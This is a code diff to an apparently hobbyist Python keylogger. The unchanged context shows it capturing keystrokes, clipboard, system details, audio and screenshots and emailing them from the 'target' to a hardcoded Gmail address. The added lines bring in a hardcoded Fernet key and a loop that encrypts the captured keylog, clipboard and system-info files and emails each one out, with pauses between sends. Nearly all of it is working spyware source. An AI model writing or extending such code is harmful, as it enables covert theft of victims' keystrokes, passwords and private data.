@@ -41,6 +41,12 @@ clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_systeminfo.txt"
+clipboard_information_e = "e_clipboard.txt"
+
+key = "tDWFF3R1Zq8zImGIcb5TwoH0xnkulPR12xGVg54e6Jg="
+
 microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
@@ -51,6 +57,7 @@ toaddress = "suriyaseyon6@gmail.com"
 
 file_path = "F:\\Coding practise\\Python\\KeyLogger\\Project"
 extend = "\\"
+file_merge = file_path + extend
 
 
 #function to send the key_log.txt file through email from target
@@ -219,3 +226,26 @@ while number_of_iterations < number_of_iterations_end:
 
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
+
+
+# encrypting .txt files
+files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
+
+count = 0
+
+for encrypting_file in files_to_encrypt:
+
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_file_names[count], 'wb') as f:
+        f.write(encrypted)
+
+    send_mail(encrypted_file_names[count], encrypted_file_names[count], toaddress)
+    count += 1
+
+    time.sleep(120)
